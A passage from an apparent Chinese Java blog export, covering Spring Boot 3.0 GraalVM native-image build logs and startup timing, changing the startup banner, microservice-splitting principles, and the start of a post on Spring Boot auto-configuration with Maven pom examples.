ei/.m2/repository/org/springframework/boot/spring-boot-starter-web/3.0.0/spring-boot-starter-web-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter-json/3.0.0/spring-boot-starter-json-3.0.0.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.14.1/jackson-databind-2.14.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.14.1/jackson-annotations-2.14.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.14.1/jackson-core-2.14.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jdk8/2.14.1/jackson-datatype-jdk8-2.14.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jsr310/2.14.1/jackson-datatype-jsr310-2.14.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/module/jackson-module-parameter-names/2.14.1/jackson-module-parameter-names-2.14.1.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter-tomcat/3.0.0/spring-boot-starter-tomcat-3.0.0.jar:/home/hanwei/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/10.1.1/tomcat-embed-core-10.1.1.jar:/home/hanwei/.m2/repository/org/apache/tomcat/embed/tomcat-embed-el/10.1.1/tomcat-embed-el-10.1.1.jar:/home/hanwei/.m2/repository/org/apache/tomcat/embed/tomcat-embed-websocket/10.1.1/tomcat-embed-websocket-10.1.1.jar:/home/hanwei/.m2/repository/org/springframework/spring-web/6.0.2/spring-web-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/spring-beans/6.0.2/spring-beans-6.0.2.jar:/home/hanwei/.m2/repository/io/micrometer/micrometer-observation/1.10.2/micrometer-observation-1.10.2.jar:/home/hanwei/.m2/repository/io/micrometer/micrometer-commons/1.10.2/micrometer-commons-1.10.2.jar:/home/hanwei/.m2/repository/org/springframework/spring-webmvc/6.0.2/spring-webmvc-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/spring-aop/6.0.2/spring-aop-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/spring-expression/6.0.2/spring-expression-6.0.2.jar com.example.demo.DemoApplication . ____ _ __ _ _ /\\\\ / ___'_ __ _ _(_)_ __ __ _ \\ \\ \\ \\( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\ \\\\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v3.0.0)2022-11-29T00:02:01.348+08:00 INFO 11794 --- [ main] com.example.demo.DemoApplication : Starting DemoApplication using Java 17.0.5 with PID 11794 (/home/hanwei/demo/target/classes started by hanwei in /home/hanwei/demo)2022-11-29T00:02:01.352+08:00 INFO 11794 --- [ main] com.example.demo.DemoApplication : No active profile set, falling back to 1 default profile: &quot;default&quot;2022-11-29T00:02:02.011+08:00 INFO 11794 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8080 (http)2022-11-29T00:02:02.018+08:00 INFO 11794 --- [ main] o.apache.catalina.core.StandardService : Starting service [Tomcat]2022-11-29T00:02:02.018+08:00 INFO 11794 --- [ main] o.apache.catalina.core.StandardEngine : Starting Servlet engine: [Apache Tomcat/10.1.1]2022-11-29T00:02:02.089+08:00 INFO 11794 --- [ main] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring embedded WebApplicationContext2022-11-29T00:02:02.090+08:00 INFO 11794 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 687 ms2022-11-29T00:02:02.347+08:00 INFO 11794 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat started on port(s): 8080 (http) with context path ''2022-11-29T00:02:02.350+08:00 INFO 11794 --- [ main] com.example.demo.DemoApplication : Started DemoApplication in 1.335 seconds (process running for 16.893) 可见执行传统 jar 包的启动速度是 1.335 seconds ，下面编译原生二进制文件。点击 Linux Idea 的 Maven 窗口的 build image 按钮。会在项目的 target 目录下（和生成的 jar 包在同一级目录）生成二进制可执行文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130/home/hanwei/sdk/graalvm-ce-java17-22.3.0/bin/java -Dmaven.multiModuleProjectDirectory=/home/hanwei/demo -Dmaven.home=/home/hanwei/.m2/wrapper/dists/apache-maven-3.8.6-bin/1ks0nkde5v1pk9vtc31i9d0lcd/apache-maven-3.8.6 -Dclassworlds.conf=/home/hanwei/.m2/wrapper/dists/apache-maven-3.8.6-bin/1ks0nkde5v1pk9vtc31i9d0lcd/apache-maven-3.8.6/bin/m2.conf -Dmaven.ext.class.path=/home/hanwei/.local/share/JetBrains/Toolbox/apps/IDEA-U/ch-0/222.4459.24/plugins/maven/lib/maven-event-listener.jar -javaagent:/home/hanwei/.local/share/JetBrains/Toolbox/apps/IDEA-U/ch-0/222.4459.24/lib/idea_rt.jar=44943:/home/hanwei/.local/share/JetBrains/Toolbox/apps/IDEA-U/ch-0/222.4459.24/bin -Dfile.encoding=UTF-8 -classpath /home/hanwei/.m2/wrapper/dists/apache-maven-3.8.6-bin/1ks0nkde5v1pk9vtc31i9d0lcd/apache-maven-3.8.6/boot/plexus-classworlds.license:/home/hanwei/.m2/wrapper/dists/apache-maven-3.8.6-bin/1ks0nkde5v1pk9vtc31i9d0lcd/apache-maven-3.8.6/boot/plexus-classworlds-2.6.0.jar org.codehaus.classworlds.Launcher -Didea.version=2022.2.4 -DskipTests=true org.graalvm.buildtools:native-maven-plugin:0.9.16:build -P native[INFO] Scanning for projects...[INFO] [INFO] --------------------------&lt; com.example:demo &gt;--------------------------[INFO] Building demo 0.0.1-SNAPSHOT[INFO] --------------------------------[ jar ]---------------------------------[INFO] [INFO] --- native-maven-plugin:0.9.16:build (default-cli) @ demo ---[WARNING] 'native:build' goal is deprecated. Use 'native:compile-no-fork' instead.[INFO] Found GraalVM installation from GRAALVM_HOME variable.[INFO] [graalvm reachability metadata repository for ch.qos.logback:logback-classic:1.4.5]: Configuration directory not found. Trying latest version.[INFO] [graalvm reachability metadata repository for ch.qos.logback:logback-classic:1.4.5]: Configuration directory is ch.qos.logback/logback-classic/1.4.1[INFO] [graalvm reachability metadata repository for org.apache.tomcat.embed:tomcat-embed-core:10.1.1]: Configuration directory not found. Trying latest version.[INFO] [graalvm reachability metadata repository for org.apache.tomcat.embed:tomcat-embed-core:10.1.1]: Configuration directory is org.apache.tomcat.embed/tomcat-embed-core/10.0.20[INFO] Executing: /home/hanwei/sdk/graalvm-ce-java17-22.3.0/bin/native-image -cp /home/hanwei/demo/target/classes:/home/hanwei/.m2/repository/org/slf4j/jul-to-slf4j/2.0.4/jul-to-slf4j-2.0.4.jar:/home/hanwei/.m2/repository/org/springframework/spring-web/6.0.2/spring-web-6.0.2.jar:/home/hanwei/.m2/repository/ch/qos/logback/logback-core/1.4.5/logback-core-1.4.5.jar:/home/hanwei/.m2/repository/jakarta/annotation/jakarta.annotation-api/2.1.1/jakarta.annotation-api-2.1.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.14.1/jackson-annotations-2.14.1.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter-json/3.0.0/spring-boot-starter-json-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/spring-core/6.0.2/spring-core-6.0.2.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/module/jackson-module-parameter-names/2.14.1/jackson-module-parameter-names-2.14.1.jar:/home/hanwei/.m2/repository/org/apache/tomcat/embed/tomcat-embed-websocket/10.1.1/tomcat-embed-websocket-10.1.1.jar:/home/hanwei/.m2/repository/ch/qos/logback/logback-classic/1.4.5/logback-classic-1.4.5.jar:/home/hanwei/.m2/repository/org/springframework/spring-jcl/6.0.2/spring-jcl-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter-web/3.0.0/spring-boot-starter-web-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/3.0.0/spring-boot-autoconfigure-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/spring-beans/6.0.2/spring-beans-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter-tomcat/3.0.0/spring-boot-starter-tomcat-3.0.0.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jsr310/2.14.1/jackson-datatype-jsr310-2.14.1.jar:/home/hanwei/.m2/repository/org/apache/tomcat/embed/tomcat-embed-el/10.1.1/tomcat-embed-el-10.1.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.14.1/jackson-core-2.14.1.jar:/home/hanwei/.m2/repository/org/apache/logging/log4j/log4j-api/2.19.0/log4j-api-2.19.0.jar:/home/hanwei/.m2/repository/org/springframework/spring-expression/6.0.2/spring-expression-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/spring-webmvc/6.0.2/spring-webmvc-6.0.2.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot/3.0.0/spring-boot-3.0.0.jar:/home/hanwei/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/10.1.1/tomcat-embed-core-10.1.1.jar:/home/hanwei/.m2/repository/org/springframework/spring-aop/6.0.2/spring-aop-6.0.2.jar:/home/hanwei/.m2/repository/org/apache/logging/log4j/log4j-to-slf4j/2.19.0/log4j-to-slf4j-2.19.0.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter/3.0.0/spring-boot-starter-3.0.0.jar:/home/hanwei/.m2/repository/org/springframework/boot/spring-boot-starter-logging/3.0.0/spring-boot-starter-logging-3.0.0.jar:/home/hanwei/.m2/repository/org/slf4j/slf4j-api/2.0.4/slf4j-api-2.0.4.jar:/home/hanwei/.m2/repository/org/springframework/spring-context/6.0.2/spring-context-6.0.2.jar:/home/hanwei/.m2/repository/io/micrometer/micrometer-observation/1.10.2/micrometer-observation-1.10.2.jar:/home/hanwei/.m2/repository/org/yaml/snakeyaml/1.33/snakeyaml-1.33.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.14.1/jackson-databind-2.14.1.jar:/home/hanwei/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jdk8/2.14.1/jackson-datatype-jdk8-2.14.1.jar:/home/hanwei/.m2/repository/io/micrometer/micrometer-commons/1.10.2/micrometer-commons-1.10.2.jar --no-fallback -H:Path=/home/hanwei/demo/target -H:Name=demo -H:ConfigurationFileDirectories=/home/hanwei/demo/target/graalvm-reachability-metadata/39f9c4cd5765941e97b499c39e24353f8a36ebd3/org.apache.tomcat.embed/tomcat-embed-core/10.0.20,/home/hanwei/demo/target/graalvm-reachability-metadata/39f9c4cd5765941e97b499c39e24353f8a36ebd3/ch.qos.logback/logback-classic/1.4.1========================================================================================================================GraalVM Native Image: Generating 'demo' (executable)...========================================================================================================================[1/7] Initializing... (6.4s @ 0.18GB) Version info: 'GraalVM 22.3.0 Java 17 CE' Java version info: '17.0.5+8-jvmci-22.3-b08' C compiler: gcc (redhat, x86_64, 11.3.1) Garbage collector: Serial GC 1 user-specific feature(s) - org.springframework.aot.nativex.feature.PreComputeFieldFeatureThe bundle named: org.apache.el.Messages, has not been found. If the bundle is part of a module, verify the bundle name is a fully qualified class name. Otherwise verify the bundle path is accessible in the classpath.Field org.springframework.core.NativeDetector#imageCode set to true at build timeField org.apache.commons.logging.LogAdapter#log4jSpiPresent set to true at build timeField org.apache.commons.logging.LogAdapter#log4jSlf4jProviderPresent set to true at build timeField org.apache.commons.logging.LogAdapter#slf4jSpiPresent set to true at build timeField org.apache.commons.logging.LogAdapter#slf4jApiPresent set to true at build timeField org.springframework.format.support.DefaultFormattingConversionService#jsr354Present set to false at build timeField org.springframework.core.KotlinDetector#kotlinPresent set to false at build timeField org.springframework.core.KotlinDetector#kotlinReflectPresent set to false at build timeField org.springframework.cglib.core.AbstractClassGenerator#imageCode set to true at build timeField org.springframework.boot.logging.java.JavaLoggingSystem$Factory#PRESENT set to true at build timeField org.springframework.boot.logging.log4j2.Log4J2LoggingSystem$Factory#PRESENT set to false at build timeField org.springframework.boot.logging.logback.LogbackLoggingSystem$Factory#PRESENT set to true at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#romePresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#jaxb2Present set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#jackson2Present set to true at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#jackson2XmlPresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#jackson2SmilePresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#jackson2CborPresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#gsonPresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#jsonbPresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#kotlinSerializationCborPresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#kotlinSerializationJsonPresent set to false at build timeField org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport#kotlinSerializationProtobufPresent set to false at build timeField org.springframework.web.servlet.view.InternalResourceViewResolver#jstlPresent set to false at build timeField org.springframework.web.context.support.StandardServletEnvironment#jndiPresent set to true at build timeField org.springframework.web.context.support.WebApplicationContextUtils#jsfPresent set to false at build timeField org.springframework.web.context.request.RequestContextHolder#jsfPresent set to false at build timeField org.springframework.context.event.ApplicationListenerMethodAdapter#reactiveStreamsPresent set to false at build timeField org.springframework.boot.logging.logback.LogbackLoggingSystemProperties#JBOSS_LOGGING_PRESENT set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#jaxb2Present set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#jackson2Present set to true at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#jackson2XmlPresent set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#jackson2SmilePresent set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#gsonPresent set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#jsonbPresent set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#kotlinSerializationCborPresent set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#kotlinSerializationJsonPresent set to false at build timeField org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter#kotlinSerializationProtobufPresent set to false at build timeField org.springframework.boot.autoconfigure.web.format.WebConversionService#JSR_354_PRESENT set to false at build timeField org.springframework.web.client.RestTemplate#romePresent set to false at build timeField org.springframework.web.client.RestTemplate#jaxb2Present set to false at build timeField org.springframework.web.client.RestTemplate#jackson2Present set to true at build timeField org.springframework.web.client.RestTemplate#jackson2XmlPresent set to false at build timeField org.springframework.web.client.RestTemplate#jackson2SmilePresent set to false at build timeField org.springframework.web.client.RestTemplate#jackson2CborPresent set to false at build timeField org.springframework.web.client.RestTemplate#gsonPresent set to false at build timeField org.springframework.web.client.RestTemplate#jsonbPresent set to false at build timeField org.springframework.web.client.RestTemplate#kotlinSerializationCborPresent set to false at build timeField org.springframework.web.client.RestTemplate#kotlinSerializationJsonPresent set to false at build timeField org.springframework.web.client.RestTemplate#kotlinSerializationProtobufPresent set to false at build timeField org.springframework.core.ReactiveAdapterRegistry#reactorPresent set to false at build timeField org.springframework.core.ReactiveAdapterRegistry#rxjava3Present set to false at build timeField org.springframework.core.ReactiveAdapterRegistry#kotlinCoroutinesPresent set to false at build timeField org.springframework.core.ReactiveAdapterRegistry#mutinyPresent set to false at build timeSLF4J: No SLF4J providers were found.SLF4J: Defaulting to no-operation (NOP) logger implementationSLF4J: See https://www.slf4j.org/codes.html#noProviders for further details.Field org.springframework.web.servlet.mvc.method.annotation.ReactiveTypeHandler#isContextPropagationPresent set to false at build timeField org.springframework.web.servlet.support.RequestContext#jstlPresent set to false at build time[2/7] Performing analysis... [*********] (54.5s @ 1.28GB) 15,278 (92.35%) of 16,544 classes reachable 24,932 (67.63%) of 36,867 fields reachable 73,534 (62.25%) of 118,132 methods reachable 780 classes, 163 fields, and 3,506 methods registered for reflection 64 classes, 70 fields, and 55 methods registered for JNI access 4 native libraries: dl, pthread, rt, z[3/7] Building universe... (5.2s @ 4.12GB)[4/7] Parsing methods... [**] (4.2s @ 4.35GB)[5/7] Inlining methods... [***] (1.9s @ 2.82GB)[6/7] Compiling methods... [*****] (27.8s @ 3.46GB)[7/7] Creating image... (6.1s @ 1.15GB) 32.83MB (49.82%) for code area: 48,151 compilation units 32.75MB (49.70%) for image heap: 354,531 objects and 320 resources 324.99KB ( 0.48%) for other data 65.90MB in total------------------------------------------------------------------------------------------------------------------------Top 10 packages in code area: Top 10 object types in image heap: 1.63MB sun.security.ssl 7.21MB byte[] for code metadata 1.04MB java.util 3.88MB byte[] for embedded resources 832.55KB java.lang.invoke 3.63MB java.lang.Class 718.00KB com.sun.crypto.provider 3.39MB java.lang.String 541.00KB org.apache.catalina.core 2.80MB byte[] for java.lang.String 499.59KB org.apache.tomcat.util.net 2.79MB byte[] for general heap data 490.49KB org.apache.coyote.http2 1.28MB com.oracle.svm.core.hub.DynamicHubCompanion 472.53KB java.lang 815.22KB byte[] for reflection metadata 461.63KB sun.security.x509 659.44KB java.lang.String[] 459.52KB java.util.concurrent 648.80KB java.util.HashMap$Node 25.43MB for 637 more packages 5.47MB for 3070 more object types------------------------------------------------------------------------------------------------------------------------ 9.1s (7.9% of total time) in 37 GCs | Peak RSS: 6.43GB | CPU load: 4.46------------------------------------------------------------------------------------------------------------------------Produced artifacts: /home/hanwei/demo/target/demo (executable) /home/hanwei/demo/target/demo.build_artifacts.txt (txt)========================================================================================================================Finished generating 'demo' in 1m 53s.[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time: 01:55 min[INFO] Finished at: 2022-11-28T23:55:32+08:00[INFO] ------------------------------------------------------------------------Process finished with exit code 0 执行二进制可执行文件，启动速度只有 0.052 seconds 。 12345678910111213141516171819202122232425262728293031323334353637[hanwei@backendcloud-centos9 ~]$ cd demo/target/[hanwei@backendcloud-centos9 target]$ lsclasses demo demo-0.0.1-SNAPSHOT.jar demo-0.0.1-SNAPSHOT.jar.original demo.build_artifacts.txt generated-sources generated-test-sources graalvm-reachability-metadata maven-archiver maven-status spring-aot surefire-reports test-classes[hanwei@backendcloud-centos9 target]$ ./demo . ____ _ __ _ _ /\\\\ / ___'_ __ _ _(_)_ __ __ _ \\ \\ \\ \\( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\ \\\\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v3.0.0)2022-11-29T00:03:59.026+08:00 INFO 12061 --- [ main] com.example.demo.DemoApplication : Starting AOT-processed DemoApplication using Java 17.0.5 with PID 12061 (/home/hanwei/demo/target/demo started by hanwei in /home/hanwei/demo/target)2022-11-29T00:03:59.026+08:00 INFO 12061 --- [ main] com.example.demo.DemoApplication : No active profile set, falling back to 1 default profile: &quot;default&quot;2022-11-29T00:03:59.040+08:00 INFO 12061 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8080 (http)2022-11-29T00:03:59.040+08:00 INFO 12061 --- [ main] o.apache.catalina.core.StandardService : Starting service [Tomcat]2022-11-29T00:03:59.040+08:00 INFO 12061 --- [ main] o.apache.catalina.core.StandardEngine : Starting Servlet engine: [Apache Tomcat/10.1.1]2022-11-29T00:03:59.044+08:00 INFO 12061 --- [ main] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring embedded WebApplicationContext2022-11-29T00:03:59.044+08:00 INFO 12061 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 18 ms2022-11-29T00:03:59.068+08:00 INFO 12061 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat started on port(s): 8080 (http) with context path ''2022-11-29T00:03:59.068+08:00 INFO 12061 --- [ main] com.example.demo.DemoApplication : Started DemoApplication in 0.052 seconds (process running for 0.056)[hanwei@backendcloud-centos9 target]$ ll -htotal 84Mdrwxr-xr-x. 5 hanwei hanwei 74 Nov 28 23:15 classes-rwxr-xr-x. 1 hanwei hanwei 66M Nov 28 23:55 demo-rw-r--r--. 1 hanwei hanwei 18M Nov 28 23:49 demo-0.0.1-SNAPSHOT.jar-rw-r--r--. 1 hanwei hanwei 119K Nov 28 23:49 demo-0.0.1-SNAPSHOT.jar.original-rw-r--r--. 1 hanwei hanwei 19 Nov 28 23:55 demo.build_artifacts.txtdrwxr-xr-x. 3 hanwei hanwei 25 Nov 28 22:59 generated-sourcesdrwxr-xr-x. 3 hanwei hanwei 30 Nov 28 22:59 generated-test-sourcesdrwxr-xr-x. 4 hanwei hanwei 101 Nov 28 23:42 graalvm-reachability-metadatadrwxr-xr-x. 2 hanwei hanwei 28 Nov 28 22:59 maven-archiverdrwxr-xr-x. 3 hanwei hanwei 35 Nov 28 22:59 maven-statusdrwxr-xr-x. 3 hanwei hanwei 18 Nov 28 22:59 spring-aotdrwxr-xr-x. 2 hanwei hanwei 153 Nov 28 23:03 surefire-reportsdrwxr-xr-x. 3 hanwei hanwei 17 Nov 28 22:59 test-classes 对比两种打包方式：jar 包和原生可执行文件，jar 包 18 兆，原生可执行文件因为可以不依赖 java 运行环境而直接运行，所以体积大些，60 兆。 上面是通过 Linux Idea 的 Maven 窗口执行的。也可以通过命令行执行 mvn 命令生成原生二进制文件。 123456789101112[hanwei@backendcloud-centos9 target]$ which mvn~/.local/bin/mvn[hanwei@backendcloud-centos9 target]$ ll ~/.local/bin/mvnlrwxrwxrwx. 1 hanwei hanwei 107 Nov 28 22:57 /home/hanwei/.local/bin/mvn -&gt; /home/hanwei/.m2/wrapper/dists/apache-maven-3.8.6-bin/1ks0nkde5v1pk9vtc31i9d0lcd/apache-maven-3.8.6/bin/mvn# 到feature-native目录下[hanwei@backendcloud-centos9 demo]$ cd ..[hanwei@backendcloud-centos9 demo]$ mvn clean# 打包[hanwei@backendcloud-centos9 demo]$ mvn package -Pnative# 可执行文件[hanwei@backendcloud-centos9 demo]$ mvn native:compile-no-fork # 到target目录下启动可执行文件 从上面的执行效果对比看出，云原生时代的 Spring Boot 3.0: GraalVM 编译的二进制可执行文件，启动速度相对于传统 jar 包提升近 30 倍（1.335 seconds -&gt; 0.052 seconds）。 # 欢迎订阅微信公众号 “InterviewCoder” ！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2020/12/28/%E3%80%90SpringBoot%E3%80%91SpringBoot3.0%20%E4%BA%91%E5%8E%9F%E7%94%9F%E6%97%B6%E4%BB%A3%E5%8D%B3%E5%B0%86%E6%9D%A5%E4%B8%B4%EF%BC%81/"},{"title":"【SpringBoot】SpringBoot启动Banner如何修改","text":"# 【SpringBoot】SpringBoot 启动 Banner 如何修改 # 1. 登录网站 http://patorjk.com/software/taag/ # 输入自己要制作的 banner 文字。 # 2. 选择自己喜欢的格式复制到 banner.txt # 将 banner.txt 放在如下图示位置 # 3. 启动后效果如下 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/12/19/%E3%80%90SpringBoot%E3%80%91SpringBoot%E5%90%AF%E5%8A%A8Banner%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9/"},{"title":"微服务拆分细则","text":"​ 在微服务的设计过程中，微服务设计有多大，微服务粒度的把控，一直是设计人员需要考虑和设计的难点。 因为服务粒度设计过大，不能得到微服务架构带来的便利，例如：更加敏态的开发，更频繁的版本发布，由于服务功能划分的小，可以根据实际的业务场景，选择更加合适的技术进行代码重构等等。 ​ 但同时我们也要注意，不是服务越” 微 “越好，因为服务的过度拆分会使架构的设计复杂度大大提升，同时也会大大提升运维和测试的复杂度等。 ​ 所以对服务拆分粒度的把控，对设计人员来讲就至关重要了，甚至对项目的成败有非常重要的影响。 这篇文档提供了一些主要的微服务拆分原则，供您参考，来帮助您进行更加合理粒度的微服务设计。 # 微服务的拆分原则 - 通用 编号 原则 说明 原则 1 基于业务分析拆分 基于 TOGAF， ADA 等 原则 2 基于 DDD 领域驱动设计中的子域设计拆分 基于领域驱动设计 原则 3 根据动作和用例拆分 比如支付 原则 4 根据名词或者资源拆 比如账号 原则 5 架构稳定 拆分的结构稳定，不会经常修改 原则 6 服务是可测试的 集成测试要可定义，测试可回溯 原则 7 单一原则 一个服务做一个业务， 自己治理自己的数据库 原则 8 开闭原则 面向对象理论， 对扩展开放， 对修改关闭 原则 9 高内聚 强一致，强依赖关系的放在一起， 减少分布式事务 原则 10 低耦合 服务间互相独立 原则 11 足够小的团队可维护，最大两个 pizza team 6-10 人一个 pizza team 原则 12 团队自治，自己的服务的开发和发布要跟别的团队尽可能小的协调 # 微服务的拆分原则 - 技术侧重点 编号 原则 说明 原则 1 潜在风险 服务的风险性 原则 2 资源性能计算性能硬盘性能内存容量网络带宽 机器的性能决定了方案的部分选择 原则 3 安全 安全要求是否很高，安全的策略 原则 4 高并发瞬时并发持续并发 并发的种类， 持续的时间 原则 5 数据库数据量大小读操作写操作数据类型 数据的类型， 读写的多少，数据量 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/03/08/%E3%80%90SpringCloud%E3%80%91%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86%E7%BB%86%E5%88%99/"},{"title":"SpringBoot自动装配原理","text":"自动装配原理： 要学会 SpringBoot 自动装配原理，首先要来看装配了什么？或者说是装配有什么用？ 1 . 自动装配了什么？ ​ Pom 文件：SpringBoot 帮我们配置好了所有 web 开发常见场景、组件、比如 tomcat、mutipart 文件上传。 ​ 配置文件：SpringBoot 帮我们装配好了所有组件或者类需要的配置，这些类都有默认的配置，可以通过 application.ymal 或者 application.properties 来修改：比如 server.port=80 修改端口号，默认为 80 2 . 自动装配有什么用？ ​ 简化 SpringMVC 复杂的配置流程、复杂的依赖引入。SpringBoot 旨在：简化开发，约定大于配置。 总结： SpringBoot 先加载所有的自动配置类 xxxAutoConfiguration 每个自动配置类按照条件进行生效，默认都会绑定配置文件指定的值。xxxProperties 里面拿。xxxProperties 和配置文件进行了绑定 生效的配置类就会给容器中装配很多组件 只要容器中有这些组件，相当于这些功能就有了 定制化配置 用户直接自己 @Bean 替换底层的组件 用户去看这个组件是获取的配置文件什么值就去修改。 xxxAutoConfiguration —&gt; 组件 —&gt; xxxProperties 里面拿值 ----&gt; application.properties # 1、SpringBoot 特点 # 1.1、依赖管理 父项目做依赖管理 123456789101112131415依赖管理 &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.4.RELEASE&lt;/version&gt;&lt;/parent&gt;他的父项目 &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;2.3.4.RELEASE&lt;/version&gt; &lt;/parent&gt;几乎声明了所有开发中常用的依赖的版本号,自动版本仲裁机制 开发导入 starter 场景启动器 1234567891011121、见到很多 spring-boot-starter-* ： *就某种场景2、只要引入starter，这个场景的所有常规需要的依赖我们都自动引入3、SpringBoot所有支持的场景https://docs.spring.io/spring-boot/docs/current/reference/html/using-spring-boot.html#using-boot-starter4、见到的 *-spring-boot-starter： 第三方为我们提供的简化开发的场景启动器。5、所有场景启动器最底层的依赖&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.3.4.RELEASE&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt;&lt;/dependency&gt; 无需关注版本号，自动版本仲裁 121、引入依赖默认都可以不写版本2、引入非版本仲裁的jar，要写版本号。 可以修改默认版本号 123451、查看spring-boot-dependencies里面规定当前依赖的版本 用的 key。2、在当前项目里面重写配置 &lt;properties&gt; &lt;mysql.version&gt;5.1.43&lt;/mysql.version&gt; &lt;/properties&gt; # 1.2、自动配置 自动配好 Tomcat 引入 Tomcat 依赖。 配置 Tomcat 123456&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;version&gt;2.3.4.RELEASE&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; 自动配好 SpringMVC 引入 SpringMVC 全套组件 自动配好 SpringMVC 常用组件（功能） 自动配好 Web 常见功能，如：字符编码问题 SpringBoot 帮我们配置好了所有 